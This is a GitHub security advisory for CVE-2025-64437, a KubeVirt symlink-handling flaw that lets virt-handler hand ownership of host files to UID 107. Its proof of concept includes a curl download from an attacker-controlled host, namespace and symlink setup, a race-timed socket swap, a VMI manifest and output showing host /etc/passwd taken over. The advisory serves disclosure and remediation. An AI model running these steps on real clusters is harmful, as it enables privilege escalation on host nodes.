# [M] KubeVirt Isolation Detection Flaw Allows Arbitrary File Permission Changes

## Summary
Severity: Medium
Advisory: GHSA-2r4r-5x78-mvqf
CVE: CVE-2025-64437
CWE: CWE-59
Ecosystem: Go
CVSS: CVSS:3.1/AV:L/AC:H/PR:H/UI:N/S:C/C:L/I:L/A:L (CVSS_V3)
Published: 2025-11-06
Source: https://github.com/advisories/GHSA-2r4r-5x78-mvqf
Type: github-advisory

## Affected
- Go: `kubevirt.io/kubevirt` — affected >=0 <1.5.3
- Go: `kubevirt.io/kubevirt` — affected >=1.6.0-alpha.0 <1.6.1

## Details
### Summary
_Short summary of the problem. Make the impact and severity as clear as possible.

It is possible to trick the `virt-handler` component into changing the ownership of arbitrary files on the host node to the unprivileged user with UID `107` due to mishandling of symlinks when determining the root mount of a `virt-launcher` pod.


### Details
_Give all details on the vulnerability. Pointing to the incriminated source code is very helpful for the maintainer._

In the current implementation, the `virt-handler` does not verify whether the `launcher-sock` is a symlink or a regular file. This oversight can be exploited, for example, to change the ownership of arbitrary files on the host node to the unprivileged user with UID `107` (the same user used by `virt-launcher`) thus, compromising the CIA (Confidentiality, Integrity and Availability) of data on the host. 
To successfully exploit this vulnerability, an attacker should be in control of the file system of the `virt-launcher` pod.



### PoC
_Complete instructions, including specific configuration details, to reproduce the vulnerability._

In this demonstration, two additional vulnerabilities are combined with the primary issue to arbitrarily change the ownership of a file located on the host node:

1. A symbolic link (`launcher-sock`) is used to manipulate the interpretation of the root mount within the affected container, effectively bypassing expected isolation boundaries.
2. Another symbolic link (`disk.img`) is employed to [alter the perceived location of data within a PVC](https://github.com/kubevirt/kubevirt/security/advisories/GHSA-qw6q-3pgr-5cwq), redirecting it to a file owned by root on the host filesystem.
3. As a result, [the ownership of an existing host file owned by root is changed to a less privileged user with UID 107](https://github.com/kubevirt/kubevirt/security/advisories/GHSA-46xp-26xh-hpqh).


It is assumed that an attacker has access to a `virt-launcher` pod's file system (for example, [obtained using another vulnerability](https://github.com/kubevirt/kubevirt/security/advisories/GHSA-9m94-w2vq-hcf9)) and also has access to the host file system with the privileges of the `qemu` user (`UID=107`). It is also assumed that they can create unprivileged user namespaces:

```bash
admin@minikube:~$ sysctl -w kernel.unprivileged_userns_clone=1
```

The below is inspired by [an article](https://blog.quarkslab.com/digging-into-linux-namespaces-part-2.html), where the attacker constructs an isolated environment solely using Linux namespaces and an augmented Alpine container root file system.

```bash
# Download an container file system from an attacker-controlled location
qemu-compromised@minikube:~$ curl http://host.minikube.internal:13337/augmented-alpine.tar -o augmented-alpine.tar
# Create a directory and extract the file system in it
qemu-compromised@minikube:~$  mkdir rootfs_alpine && tar -xf augmented-alpine.tar -C rootfs_alpine
# Create a MOUNT and remapped USER namespace environment and execute a shell process in it
qemu-compromised@minikube:~$ unshare --user --map-root-user --mount sh
# Bind-mount the alpine rootfs, move into it and create a directory for the old rootfs.
# The user is root in its new USER namesapce
root@minikube:~$ mount --bind rootfs_alpine rootfs_alpine && cd rootfs_alpine && mkdir hostfs_root
# Swap the current root of the process and store the old one within a directory
root@minikube:~$ pivot_root . hostfs_root 
root@minikube:~$ export PATH=/bin:/usr/bin:/usr/sbin
# Create the directory with the same path as the PVC mounted within the `virt-launcher`. In it `virt-handler` will search for a `disk.img` file associated with a volume mount
root@minikube:~$ PVC_PATH="/var/run/kubevirt-private/vmi-disks/corrupted-pvc" && \
mkdir -p "${PVC_PATH}" && \
cd "${PVC_PATH}"
# Create the `disk.img` symlink pointing to `/etc/passwd` of the host in the old root mount directory
root@minikube:~$ ln -sf ../../../../../../../../../../../../hostfs_root/etc/passwd disk.img
# Create the socket wich will confuse the isolator detector and start listening on it
root@minikube:~$ socat -d -d UNIX-LISTEN:/tmp/bad.sock,fork,reuseaddr -
```


After the environment is set, the `launcher-sock` in the `virt-launcher` container should be replaced with a symlink to `../../../../../../../../../proc/2245509/root/tmp/bad.sock` (2245509 is the PID of the above isolated shell process). This should be done, however, in a the right moment. For this demonstration, it was decided to trigger the bug while leveraging a race condition when creating or updating a VMI:

```go
//pkg/virt-handler/vm.go

func (c *VirtualMachineController) vmUpdateHelperDefault(origVMI *v1.VirtualMachineInstance, domainExists bool) error {
  // ...
  //!!! MK: the change should happen here before executing the below line !!!
  isolationRes, err := c.podIsolationDetector.Detect(vmi)
		if err != nil {
			return fmt.Errorf(failedDetectIsolationFmt, err)
		}
		virtLauncherRootMount, err := isolationRes.MountRoot()
		if err != nil {
			return err
		}
		// ...

		// initialize disks images for empty PVC
		hostDiskCreator := hostdisk.NewHostDiskCreator(c.recorder, lessPVCSpaceToleration, minimumPVCReserveBytes, virtLauncherRootMount)
		// MK: here the permissions are changed
		err = hostDiskCreator.Create(vmi)
		if err != nil {
			return fmt.Errorf("preparing host-disks failed: %v", err)
		}
    // ...

```

The manifest of the #acr("vmi") which is going to trigger the bug is:

```yaml
# The PVC will be used for the `disk.img` related bug
apiVersion: v1
kind: PersistentVolumeClaim
metadata:
  name: corrupted-pvc
spec:
  accessModes:
    - ReadWriteMany
  resources:
    requests:
      storage: 500Mi
---
apiVersion: kubevirt.io/v1
kind: VirtualMachineInstance
metadata:
  labels:
  name: launcher-symlink-confusion
spec:
  domain:
    devices:
      disks:
      - name: containerdisk
        disk:
          bus: virtio
      - name: corrupted-pvc
        disk:
          bus: virtio
      - name: cloudinitdisk
        disk:
          bus: virtio
    resources:
      requests:
        memory: 1024M
  terminationGracePeriodSeconds: 0
  volumes:
  - name: containerdisk
    containerDisk:
      image: quay.io/kubevirt/cirros-container-disk-demo
  - name: corrupted-pvc
    persistentVolumeClaim:
      claimName: corrupted-pvc
  - name: cloudinitdisk      
    cloudInitNoCloud:
      userDataBase64: SGkuXG4=
```

Just before the line is executed, the attacker should replace the `launcher-sock` with a symlink to the `bad.sock` controlled by the isolated process:

```bash
# the namespaced process controlled by the attacker has pid=2245509
qemu-compromised@minikube:~$ p=$(pgrep -af "/usr/bin/virt-launcher" | grep -v virt-launcher-monitor | awk '{print $1}') &&  ln -sf ../../../../../../../../../proc/2245509/root/tmp/bad.sock /proc/$p/root/var/run/kubevirt/sockets/launcher-sock
```


Upon successful exploitation, `virt-launcher` connects to the attacker controlled socket, misinterprets the root mount and changes the permissions of the host's `/etc/passwd` file:


```bash
# `virt-launcher` connects successfully
root@minikube:~$ socat -d -d UNIX-LISTEN:/tmp/bad.sock,fork,reuseaddr -
...
2025/05/27 17:17:35 socat[2245509] N accepting connection from AF=1 "<anon>" on AF=1 "/tmp/bad.sock"
2025/05/27 17:17:35 socat[2245509] N forked off child process 2252010
2025/05/27 17:17:35 socat[2245509] N listening on AF=1 "/tmp/bad.sock"
2025/05/27 17:17:35 socat[2252010] N reading from and writing to stdio
2025/05/27 17:17:35 socat[2252010] N starting data transfer loop with FDs [6,6] and [0,1]
PRI * HTTP/2.0
```

```bash
admin@minikube:~$ ls -al /etc/passwd
-rw-r--r--. 1 compromised-qemu systemd-resolve 1337 May 23 13:19 /etc/passwd

admin@minikube:~$ cat /etc/passwd
root:x:0:0:root:/root:/bin/bash
daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
bin:x:2:2:bin:/bin:/usr/sbin/nologin
sys:x:3:3:sys:/dev:/usr/sbin/nologin
sync:x:4:65534:sync:/bin:/bin/sync
games:x:5:60:games:/usr/games:/usr/sbin/nologin
man:x:6:12:man:/var/cache/man:/usr/sbin/nologin
lp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologin
mail:x:8:8:mail:/var/mail:/usr/sbin/nologin
news:x:9:9:news:/var/spool/news:/usr/sbin/nologin
uucp:x:10:10:uucp:/var/spool/uucp:/usr/sbin/nologin
proxy:x:13:13:proxy:/bin:/usr/sbin/nologin
www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin
backup:x:34:34:backup:/var/backups:/usr/sbin/nologin
list:x:38:38:Mailing List Manager:/var/list:/usr/sbin/nologin
irc:x:39:39:ircd:/run/ircd:/usr/sbin/nologin
gnats:x:41:41:Gnats Bug-Reporting System (admin):/var/lib/gnats:/usr/sbin/nologin
nobody:x:65534:65534:nobody:/nonexistent:/usr/sbin/nologin
_apt:x:100:65534::/nonexistent:/usr/sbin/nologin
_rpc:x:101:65534::/run/rpcbind:/usr/sbin/nologin
systemd-network:x:102:106:systemd Network Management,,,:/run/systemd:/usr/sbin/nologin
systemd-resolve:x:103:107:systemd Resolver,,,:/run/systemd:/usr/sbin/nologin
statd:x:104:65534::/var/lib/nfs:/usr/sbin/nologin
sshd:x:105:65534::/run/sshd:/usr/sbin/nologin
docker:x:1000:999:,,,:/home/docker:/bin/bash
compromised-qemu:x:107:107::/home/compromised-qemu:/bin/bash
```

The attacker controlling an unprivileged user can now update the contents of the file.

### Impact
_What kind of vulnerability is it? Who is impacted?_

This oversight can be exploited, for example, to change the ownership of arbitrary files on the host node to the unprivileged user with UID `107` (the same user used by `virt-launcher`) thus, compromising the CIA (Confidentiality, Integrity and Availability) of data on the host.

## References
- https://github.com/kubevirt/kubevirt/security/advisories/GHSA-2r4r-5x78-mvqf
- https://nvd.nist.gov/vuln/detail/CVE-2025-64437
- https://github.com/kubevirt/kubevirt/commit/3ce9f41c54d04a65f10b23a46771391c00659afb
- https://github.com/kubevirt/kubevirt/commit/8644dbe0d04784b0bfa8395b91ecbd6001f88f6b
- https://github.com/kubevirt/kubevirt/commit/f59ca63133f25de8fceb3e2a0e5cc0b7bdb6a265
- https://github.com/kubevirt/kubevirt
